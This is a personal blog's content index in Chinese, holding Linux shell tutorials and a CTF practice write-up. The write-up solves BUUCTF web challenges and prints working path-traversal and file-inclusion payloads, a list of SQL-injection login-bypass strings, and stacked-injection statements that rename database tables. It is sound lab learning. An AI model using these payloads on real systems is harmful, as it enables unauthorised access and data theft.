{"meta":{"title":"huhu","subtitle":"myhの博客","description":"本科 | 软件工程 | 网络安全","author":"huhu","url":"https://huhu-myh.github.io","root":"/"},"pages":[{"title":"404","date":"2019-08-10T08:41:10.000Z","updated":"2022-01-13T11:49:03.080Z","comments":true,"path":"404.html","permalink":"https://huhu-myh.github.io/404.html","excerpt":"","text":""},{"title":"","date":"2022-01-13T11:49:03.178Z","updated":"2022-01-13T11:49:03.178Z","comments":true,"path":"baidu_verify_xxxxxxx.html","permalink":"https://huhu-myh.github.io/baidu_verify_xxxxxxx.html","excerpt":"","text":"wvlc3L96QK"},{"title":"","date":"2022-01-13T11:49:03.180Z","updated":"2022-01-13T11:49:03.180Z","comments":true,"path":"google1xxxxxxx0.html","permalink":"https://huhu-myh.github.io/google1xxxxxxx0.html","excerpt":"","text":"google-site-verification: google110e5e5e14c8dcf0.html"},{"title":"about","date":"2022-01-13T16:00:00.000Z","updated":"2022-01-14T03:04:02.974Z","comments":true,"path":"about/index.html","permalink":"https://huhu-myh.github.io/about/index.html","excerpt":"","text":""},{"title":"放松一下","date":"2019-08-10T08:41:10.000Z","updated":"2022-01-13T11:49:03.090Z","comments":true,"path":"List/index.html","permalink":"https://huhu-myh.github.io/List/index.html","excerpt":"","text":"影音资源共享"},{"title":"archives","date":"2019-10-24T16:00:00.000Z","updated":"2022-01-13T11:49:03.178Z","comments":true,"path":"archives/index.html","permalink":"https://huhu-myh.github.io/archives/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-10-24T16:00:00.000Z","updated":"2022-01-13T11:49:03.179Z","comments":true,"path":"categories/index.html","permalink":"https://huhu-myh.github.io/categories/index.html","excerpt":"","text":""},{"title":"友链","date":"2019-07-19T08:42:10.000Z","updated":"2022-01-13T11:49:03.180Z","comments":true,"path":"friends/index.html","permalink":"https://huhu-myh.github.io/friends/index.html","excerpt":"","text":""},{"title":"留言板","date":"2019-10-24T16:00:00.000Z","updated":"2022-01-14T01:37:55.640Z","comments":true,"path":"contact/index.html","permalink":"https://huhu-myh.github.io/contact/index.html","excerpt":"","text":"畅所欲言 在这里可以留下你的足迹，欢迎在下方留言，欢迎交换友链，一起交流学习！ 友链 myhの友链信息 博客名称: myhの博客 博客网址: https://huhu-myh.github.io/ 博客头像: https://t7.baidu.com/it/u=2674910008,1354282542&amp;fm=193?qq-pf-to=pcqq.c2c 博客介绍: The harder you work, the luckier you will be"},{"title":"统计","date":"2020-10-31T02:11:28.000Z","updated":"2022-01-13T11:49:03.179Z","comments":true,"path":"census/index.html","permalink":"https://huhu-myh.github.io/census/index.html","excerpt":"","text":""},{"title":"资源分享","date":"2019-07-19T08:40:27.000Z","updated":"2022-01-13T11:49:03.181Z","comments":true,"path":"resource/index.html","permalink":"https://huhu-myh.github.io/resource/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-07-19T08:40:27.000Z","updated":"2022-01-13T11:49:03.182Z","comments":true,"path":"tags/index.html","permalink":"https://huhu-myh.github.io/tags/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2022-01-13T11:49:03.091Z","comments":true,"path":"List/music/index.html","permalink":"https://huhu-myh.github.io/List/music/index.html","excerpt":"","text":""},{"title":"相册","date":"2022-01-13T11:49:03.085Z","updated":"2022-01-13T11:49:03.085Z","comments":true,"path":"List/galleries/index.html","permalink":"https://huhu-myh.github.io/List/galleries/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2022-01-13T11:49:03.091Z","comments":true,"path":"List/tools/index.html","permalink":"https://huhu-myh.github.io/List/tools/index.html","excerpt":"","text":""},{"title":"视频","date":"2019-08-10T08:41:10.000Z","updated":"2022-01-13T11:49:03.091Z","comments":true,"path":"List/movies/index.html","permalink":"https://huhu-myh.github.io/List/movies/index.html","excerpt":"","text":""},{"title":"二次元风","date":"2022-01-13T11:49:03.086Z","updated":"2022-01-13T11:49:03.086Z","comments":true,"path":"List/galleries/二次元风/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E4%BA%8C%E6%AC%A1%E5%85%83%E9%A3%8E/index.html","excerpt":"","text":""},{"title":"乖巧小狗","date":"2022-01-13T11:49:03.085Z","updated":"2022-01-13T11:49:03.085Z","comments":true,"path":"List/galleries/乖巧小狗/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E4%B9%96%E5%B7%A7%E5%B0%8F%E7%8B%97/index.html","excerpt":"","text":""},{"title":"呆萌猫咪","date":"2022-01-13T11:49:03.087Z","updated":"2022-01-13T11:49:03.087Z","comments":true,"path":"List/galleries/呆萌猫咪/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E5%91%86%E8%90%8C%E7%8C%AB%E5%92%AA/index.html","excerpt":"","text":""},{"title":"动漫插画","date":"2022-01-13T11:49:03.086Z","updated":"2022-01-13T11:49:03.086Z","comments":true,"path":"List/galleries/动漫插画/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/index.html","excerpt":"","text":""},{"title":"城市风光","date":"2022-01-13T11:49:03.088Z","updated":"2022-01-13T11:49:03.088Z","comments":true,"path":"List/galleries/城市风光/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E5%9F%8E%E5%B8%82%E9%A3%8E%E5%85%89/index.html","excerpt":"","text":""},{"title":"清新花卉","date":"2022-01-13T11:49:03.088Z","updated":"2022-01-13T11:49:03.088Z","comments":true,"path":"List/galleries/清新花卉/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E6%B8%85%E6%96%B0%E8%8A%B1%E5%8D%89/index.html","excerpt":"","text":""},{"title":"动漫人物","date":"2022-01-13T11:49:03.086Z","updated":"2022-01-13T11:49:03.086Z","comments":true,"path":"List/galleries/动漫人物/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E5%8A%A8%E6%BC%AB%E4%BA%BA%E7%89%A9/index.html","excerpt":"","text":""},{"title":"动漫风景","date":"2022-01-13T11:49:03.087Z","updated":"2022-01-13T11:49:03.087Z","comments":true,"path":"List/galleries/动漫风景/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""},{"title":"炫酷跑车","date":"2022-01-13T11:49:03.089Z","updated":"2022-01-13T11:49:03.089Z","comments":true,"path":"List/galleries/炫酷跑车/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E7%82%AB%E9%85%B7%E8%B7%91%E8%BD%A6/index.html","excerpt":"","text":""},{"title":"璀璨星空","date":"2022-01-13T11:49:03.089Z","updated":"2022-01-13T11:49:03.089Z","comments":true,"path":"List/galleries/璀璨星空/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/index.html","excerpt":"","text":""},{"title":"自然风景","date":"2022-01-13T11:49:03.090Z","updated":"2022-01-13T11:49:03.090Z","comments":true,"path":"List/galleries/自然风景/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E8%87%AA%E7%84%B6%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""},{"title":"甜美食品","date":"2022-01-13T11:49:03.090Z","updated":"2022-01-13T11:49:03.090Z","comments":true,"path":"List/galleries/甜美食品/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E7%94%9C%E7%BE%8E%E9%A3%9F%E5%93%81/index.html","excerpt":"","text":""}],"posts":[{"title":"Linux学习-第二章","slug":"linux2","date":"2022-01-15T09:28:46.000Z","updated":"2022-01-15T12:34:53.333Z","comments":true,"path":"posts/myh10005.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10005.html","excerpt":"","text":"第二章：基本的 bash shell 命令3.1浏览文件系统3.1.1 Linux文件系统Linux不同于WIndows，在路径名中不使用驱动器盘符。 Linux将文件存储在单个目录结构中，这个目录被称为虚拟目录（ virtual directory）。虚拟目录将安装在PC上的所有存储设备的文件路径纳入单个目录结构中。Linux虚拟目录结构只包含一个称为根（ root）目录的基础目录。根目录下的目录和文件会按照访问它们的目录路径一一列出，这点跟Windows类似。 在Linux PC上安装的第一块硬盘称为根驱动器。根驱动器包含了虚拟目录的核心，其他目录都是从那里开始构建的。Linux会在根驱动器上创建一些特别的目录，我们称之为挂载点（ mount point）。挂载点是虚拟目录中用于分配额外存储设备的目录。虚拟目录会让文件和目录出现在这些挂载点目录中，然而实际上它们却存储在另外一个驱动器中。 如图Disk1硬盘和虚拟目录的根目录关联起来。Disk2硬盘就可以挂载到虚拟目录结构中的任何地方。在这个例子中，第二块硬盘被挂载到了/home位置，home这个目录就是一个挂载点，用户目录都位于这个位置。 ​ 常见的Linux目录名称 / 虚拟目录的根目录。通常不会在这里存储文件 /bin 二进制目录，存放许多用户级的GNU工具 /bot 启动目录，存放启动文件 /dev 设备目录， Linux在这里创建设备节点 /etc 系统配置文件目录 /home 主目录， Linux在这里创建用户目录 /lib 库目录，存放系统和应用程序的库文件 /media 媒体目录，可移动媒体设备的常用挂载点 /mnt 挂载目录，另一个可移动媒体设备的常用挂载点 /opt 可选目录，常用于存放第三方软件包和数据文件 /proc 进程目录，存放现有硬件及当前进程的相关信息 /root root用户的主目录 /sbin 系统二进制目录，存放许多GNU管理员级工具 /run 运行目录，存放系统运作时的运行时数据 /srv 服务目录，存放本地服务的相关文件 /sys 系统目录，存放系统硬件信息的相关文件 /tmp 临时目录，可以在该目录中创建和删除临时工作文件 /usr 用户二进制目录，大量用户级的GNU工具和数据文件都存储在这里 /var 可变目录，用以存放经常变化的文件，比如日志文件 3.1.2 遍历目录在Linux文件系统上，可以使用切换目录命令cd将shell会话切换到另一个目录。 cd命令的格式非常简单：cd destinationcd命令可接受单个参数destination，用以指定想切换到的目录名。如果没有为cd命令指定目标路径，它将切换到用户主目录。destination参数可以用两种方式表示：一种是使用绝对文件路径，另一种是使用相对文件路径。 1.绝对文件路径 ​ 对文件路径总是以正斜线（ /）作为起始，指明虚拟文件系统的根目录。 如图刚开始是在/root目录中，如果切换到usr/bin目录中，就直接使用 cd /usr/bin，（一定最开始是根目录！） 这里的 pwd 是显示当前所在的位置的命令。 2.相对文件路径 就是基于你目前所在的目录进行相对的移动。 如图，刚开始在usr目录中，要进入usr的lib目录中，则可以直接 cd lib 。（ls 是显示当前目录下的文件和子目录，后面会讲。） 有两个特殊字符可用于相对文件路径中： 单点符（ .），表示当前目录； 双点符（ ..），表示当前目录的父目录。 重点就是双点符，可以较为方便的在相对文件路径中使用： 先写到这~ 文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)","categories":[{"name":"学习","slug":"学习","permalink":"https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"}],"author":"myh"},{"title":"buuctf练习","slug":"buuctf练习","date":"2022-01-15T07:03:43.000Z","updated":"2022-01-15T12:34:47.922Z","comments":true,"path":"posts/myh10004.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10004.html","excerpt":"","text":"1.[HCTF 2018]Warmup考察：php审计：mb_substr()+mb_strpos()绕过 打开题目地址后出现的是一个滑稽的表情，接着查看原码发现注释有 source.php ，访问后得到一段源码： &lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; //白名单 if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) //需要同时满足三个条件：传入了file参数，并且是字符串，并且满足checkfile函数 ) { include $_REQUEST['file']; //执行给出的file参数值 exit; } else { echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; } ?&gt; flag{408cfb51-0d75-4976-9d2e-e431e5d0fd77} 先来介绍下两个函数mb_substr()+mb_strpos()： **mb_strpos()**：返回要查找的字符串在别一个字符串中首次出现的位置 mb_strpos( string $haystack, string $needle, ):int // haystack：要被检查的字符串。 // needle：要搜索的字符串 **mb_substr()** 函数返回字符串的一部分。 mb_substr( string $str, int $start, int $length = NULL, ):string //str 必需。从该 string 中提取子字符串。 //start 必需。规定在字符串的何处开始。 //ength 可选。规定要返回的字符串长度。默认是直到字符串的结尾 request() //可以以get或者post提交参数 include //文件包含,包含并运行文件中的内容 $_page . '?' //将$_page后拼接 ? public static function checkFile(&amp;$page) &amp;&amp; emmm::checkFile($_REQUEST['file']) 上面这代码表示 将request的file值 传入$page，其实就是将file参数传入到page中 &amp;引用传递变量。这是通过在函数内建立一个本地变量并且该变量在呼叫范围内引用了同一个内容来实现的。例如： &lt;?php function sub (&amp;$var) { $var++; } $num=5; sub($num); ?&gt; 将使 $num 变成 6。这是因为在 sub 函数中变量 $var 指向了和 $num 指向的同一个内容。 ​ 通过源码提示hin.php，访问之后得到flag在ffffllllaaaagggg中，所以我们肯定要使include包含这个文件，从而得到我们的flag。但是通过checkfile函数可知，返回true的条件是所传入的file参数值（或者是经过函数处理后的值）需要在白名单里，所以直接传入ffffllllaaaagggg肯定不得行。这是最终要的来啦，就是考虑题目给的函数，通过函数的处理的值使得我们能够返回true。所以构造payload为： 1.file=source.php?/../../../../../ffffllllaaaagggg 2.file=source.php%3f/../../../../../ffffllllaaaagggg //这里的%3f是 ? 经过ulr加密后的值，由于每次传参十，都会自动urldecode一次，所以等价于第一个 3.file=source.php%253f/../../../../../ffffllllaaaagggg //这里的%253f是 ? 经过两次ulr加密后的值，在经过一次自动处理以及checkfile函数里的urldecode函数处理一次后就等价于第一个了，同样可以返回true //说明一下../是返回上一级目录，首先在source.php?加一个 / ，使其成为不存在的目录，然后../就返回到source.php所在的目录，之后一次次试在哪个目录里，自己也可以在本地试试../的目录关系 之后传入payload就会得到flag啦~ 再补充一下 ./ ../ / 的说明： ./ 表示当前目录下 ../ 表示上一级目录 / 表示根目录 如图，以这个文件夹为例，在buu文件中，有2.png，那就表示为 ./buuctf练习/1.png 在此目录下，有hello.md，那就表示为： ./hello.md 或者 hello.md 如果2.png在上层目录的一个image文件下，那就是： ../image/1.png 2.[极客大挑战 2019]EasySQL根据题目提示是SQL注入，所以先试着判断注入点和引号闭合方式：在username输入：1’，密码随便输：1，出现语法报错： 则可以知道是单引号闭合，接着开始试试万能密码：1’ or 1=1# ,则输入后后台语句大致就是： select * from table_name where username='1' or 1=1 # ' and password='1' ; 由于#会把后面的都注释掉，所以就等价于： select * from table_name where username='1' or 1=1 可知 1=1 是个恒等式，所以就登陆成功了，得到flag~ 下面收集一些万能密码： 'or'='or' 'or 1=1-- ''or 1=1-- 'or'a'='a \"or \"a\"=\"a \"or\"=\"a'='a ')or('a'='a or 1=1-- a'or' 1=1-- \"or\"=\"a'='a 'or''=' 1 or '1'='1'=1 1 or '1'='1' or 1=1 'OR 1=1%00 \"or 1=1%00 'xor admin' or 'a'='a 密码随便 3.[极客大挑战 2019]Havefun这题还是比较简单的哈，进去之后就是一张可爱的猫猫图，有点乖哈哈，查看网页源代码，发现有一段PHP代码，就是get型参数传入： 然后构造payload为：http://49122460-5b04-4fd8-b15c-e5fad13e769c.node4.buuoj.cn:81/?cat=dog就可以了~ 4.[ACTF2020 新生赛]Include从题目可以看出来考察的是文件包含，进入题目看到tip，点击，网页进行了跳转，此时发现url为： 可以看到后面有get型参数file值传入，此时传入参数后回显为这句话，那我们就直接通过==php://filter伪协议==读取整个flag.php，构造payload为： 可以看到有一串base64加密的编码，解密后得到flag： &lt;?php echo \"Can you find out the flag?\"; //flag{0f1d073a-d716-4aa6-ae19-16dbba744a1d} 5.[强网杯 2019]随便注从题目知应该是SQL注入，进入题目看到有一个输入框，输入 1 ，正常返回，加个单引号 1’ 返回SQL语句错误，即存在SQL注入 然后使用order by 2,order by 3 查看列数，发现只有两列 尝试使用联合查询union select 发现回显语是select被正则过滤了 emmm,开始大小写、联合注释等绕过waf,但是没得用就很气呦……，后来查了下资料原来是忽略掉的堆叠注入！，那就开始直接查看表名： 1';show tables; --+ //在SQL中，分号（;）是用来表示一条sql语句的结束。堆叠注入就是结束一个sql语句后，会继续执行下一条构造的SQL语句。 然后对应查看对应的列名： 1';show columns from words; --+ 1';show columns from `1919810931114514`; --+ //字符串为表名操作时要加反引号 这里可以看到我们要的flag是在对应的表中，根据第一次输入 1 的结果来看后台的语句应该是: select * from words where id = 所以我们目前最重要的就是从另一个表中获得数据，但是我们只能从 “word” 这个表里取数据，然后看了别人的文章发现还可以改表的名称来读flag! 所以，思路就很清晰了： 更改表的名称。将words改为随便其他的名字比如words1，然后将”1919810931114514”表的名字替换为words 给新的words表增加一列id 构造payload为（提醒： 字符串为表名操作时要加反引号！！！）： 1';rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; --+ //这里使用了rename和alert，具体用法可以查一下，不在正则过滤的范围内 //注意一定要使用反引号！ 接着再查看下表，其实就已经查出来flag了，啊tql，学到了~ 最后感谢有人复现让我学习：https://github.com/CTFTraining/qwb_2019_supersqli 最后吐槽一下自己，看了warmup题，看好长时间不会，哎，还是太菜了，慢慢学吧~","categories":[{"name":"CTF","slug":"CTF","permalink":"https://huhu-myh.github.io/categories/CTF/"}],"tags":[{"name":"buu练习","slug":"buu练习","permalink":"https://huhu-myh.github.io/tags/buu%E7%BB%83%E4%B9%A0/"}],"author":"myh"},{"title":"Linux学习-第一章","slug":"Linux学习","date":"2022-01-14T10:52:58.000Z","updated":"2022-01-15T12:34:37.582Z","comments":true,"path":"posts/myh10002.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10002.html","excerpt":"","text":"第一章：初识Linux1.1 shell​ Linux shell是一种特殊的交互式工具。它为用户提供了启动程序、管理文件系统中的文件以及运行在Linux系统上的进程的途径。 shell的核心是命令行提示符。命令行提示符是shell负责交互的部分。它允许你输入文本命令，然后解释命令，并在内核中执行。 ​ shell包含了一组内部命令，用这些命令可以完成诸如复制文件、移动文件、重命名文件、显示和终止系统中正运行的程序等操作。 shell也允许你在命令行提示符中输入程序的名称，它会将程序名传递给内核以启动它。 ​ 也可以将多个shell命令放入文件中作为程序执行，这些文件被称作shell脚本。你在命令行上执行的任何命令都可放进一个shell脚本中作为一组命令执行。这为创建那种需要把几个命令放在一起来工作的工具提供了便利。 ​ linux有好几种版本的shell，默认的是bash shell。 1.2 Linux系统分类​ Linux主要的系统可以分为两类：Debian和Redhat，话有一些其他的自由发布的版本。 ​ Debian系列主要有Debian、Ubuntu等。 ​ Redhat系列主要有Redhat、CentOs等。 ​ 不同的系统版本某些命令可能是不一样的，比如 Debian 使用 apt-get来安装包，但CentOs使用 yum。 第一张就是简要介绍一下什么是linux shell以及常见的发行版本。下一章，将详细讲解shell的使用。 文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)","categories":[{"name":"学习","slug":"学习","permalink":"https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"}],"author":"myh"},{"title":"hello","slug":"hello","date":"2022-01-14T05:21:39.000Z","updated":"2022-01-15T12:33:47.776Z","comments":true,"path":"posts/myh10000.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10000.html","excerpt":"","text":"Day1hello，这是我的第一篇博客,以后这里会记录我的日常生活和学习! 大概更新的学习内容会有CTF，渗透，机器学习，python，Java的相关知识，期待您的来访~","categories":[{"name":"日常","slug":"日常","permalink":"https://huhu-myh.github.io/categories/%E6%97%A5%E5%B8%B8/"}],"tags":[{"name":"diary","slug":"diary","permalink":"https://huhu-myh.github.io/tags/diary/"}],"author":"myh"},{"title":"渗透学习","slug":"渗透","date":"2022-01-14T05:13:01.000Z","updated":"2022-01-15T12:34:25.567Z","comments":true,"path":"posts/myh10001.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10001.html","excerpt":"","text":"","categories":[{"name":"网安","slug":"网安","permalink":"https://huhu-myh.github.io/categories/%E7%BD%91%E5%AE%89/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://huhu-myh.github.io/tags/%E6%B8%97%E9%80%8F/"}],"author":"myh"}],"categories":[{"name":"学习","slug":"学习","permalink":"https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"},{"name":"CTF","slug":"CTF","permalink":"https://huhu-myh.github.io/categories/CTF/"},{"name":"日常","slug":"日常","permalink":"https://huhu-myh.github.io/categories/%E6%97%A5%E5%B8%B8/"},{"name":"网安","slug":"网安","permalink":"https://huhu-myh.github.io/categories/%E7%BD%91%E5%AE%89/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"},{"name":"buu练习","slug":"buu练习","permalink":"https://huhu-myh.github.io/tags/buu%E7%BB%83%E4%B9%A0/"},{"name":"diary","slug":"diary","permalink":"https://huhu-myh.github.io/tags/diary/"},{"name":"渗透","slug":"渗透","permalink":"https://huhu-myh.github.io/tags/%E6%B8%97%E9%80%8F/"}]}